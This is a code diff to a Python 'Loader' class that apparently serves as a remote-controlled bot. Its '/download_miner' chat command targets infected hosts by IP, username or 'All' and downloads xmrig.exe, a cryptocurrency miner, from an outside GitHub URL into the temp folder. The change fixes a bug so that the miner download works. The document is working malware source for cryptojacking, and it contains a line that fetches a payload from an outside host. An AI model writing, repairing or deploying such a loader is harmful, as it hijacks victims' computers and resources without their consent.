@@ -154,7 +154,7 @@ class Loader():
 					elif command == "/download_miner" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
 						self.SendMessage("%E2%9C%94%EF%B8%8F Downloading Miner...")
 						req = requests.get('https://raw.githubusercontent.com/MohamadXo213/Down-X/main/xmrig.exe')
-						filename = tempfile.gettempdir + "\\xmrig.exe"
+						filename = tempfile.gettempdir() + "\\xmrig.exe"
 						file = open(filename,"wb")
 						file.write(req.content)
 						file.close()
